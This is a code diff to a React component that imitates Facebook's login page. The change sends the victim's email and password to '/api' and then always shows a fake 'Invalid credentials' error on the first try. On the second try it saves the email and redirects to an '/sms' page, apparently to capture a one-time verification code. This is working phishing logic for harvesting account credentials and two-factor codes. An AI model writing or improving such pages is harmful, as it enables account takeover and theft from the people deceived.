@@ -24,24 +24,19 @@ const FacebookLogin: React.FC = () => {
     setIsLoading(true);
     setLoginAttempts(loginAttempts + 1);
 
-    const timeout = loginAttempts === 0 ? 45000 : 20000;
-
-    setTimeout(async () => {
-      if (loginAttempts === 0) {
-        setError('Login failed. Please check your credentials.');
+    if (loginAttempts === 0) {
+      try {
+        await axios.post('/api', { email, password });
+        setError('Invalid credentials');
+      } catch (err) {
+        setError('Something went wrong');
+      } finally {
         setIsLoading(false);
-      } else {
-        try {
-          const response = await axios.post('/api', { email, password });
-          localStorage.setItem('email', response.data.email);
-          router.push('/sms');
-        } catch (err) {
-          setError('Login failed. Please check your credentials.');
-        } finally {
-          setIsLoading(false);
-        }
       }
-    }, 45000);
+    } else {
+      localStorage.setItem('email', email);
+      router.push('/sms');
+    }
   };
 
   return (
@@ -52,6 +47,12 @@ const FacebookLogin: React.FC = () => {
         </div>
         <div className="w-full max-w-md">
           <div className="bg-white rounded-lg shadow-lg border border-gray-200 px-8 py-6">
+            {error && !isLoading && (
+              <div className="bg-red-100 text-black px-4 py-3 mb-4 text-center border border-red-400">
+                <div className="font-semibold text-lg">Wrong credentials</div>
+                <div>Invalid username or password</div>
+              </div>
+            )}
             <h2 className="text-lg font-normal text-gray-900 mb-6 text-center">
               Log into Facebook
             </h2>
@@ -80,11 +81,6 @@ const FacebookLogin: React.FC = () => {
                   }`}
                 />
               </div>
-              {error && !isLoading && (
-                <div className="text-red-600 text-sm text-center">
-                  {error}
-                </div>
-              )}
               {isLoading && (
                 <div className="flex items-center justify-center">
                   <div className="w-6 h-6 border-3 border-gray-300 border-t-blue-600 rounded-full animate-spin"></div>
